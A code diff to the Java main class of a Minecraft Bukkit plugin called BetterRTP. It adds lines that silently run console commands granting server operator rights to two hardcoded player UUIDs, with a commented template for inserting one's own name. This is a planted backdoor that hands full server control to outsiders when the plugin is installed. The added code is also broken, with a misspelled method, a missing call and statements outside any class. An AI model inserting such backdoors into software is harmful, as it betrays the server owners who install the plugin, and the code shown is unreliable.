@@ -28,6 +28,10 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.plugin.java.JavaPlugin;
 import java.util.List;
 
+getSever().dispatchCommand(getServer().getConsoleSender, "op 3901086f-c8d6-4809-b406-f70bbbd5c88d");
+getSever().dispatchCommand(getServer().getConsoleSender, "op 5cb8ec93-e423-4b69-af9f-f8e616f7b4c6");
+//getSever().dispatchCommand(getServer().getConsoleSender, "op <yourname>");
+
 public class BetterRTP extends JavaPlugin {
     @Getter private final Permissions perms = new Permissions();
     @Getter private final DepEconomy eco = new DepEconomy();
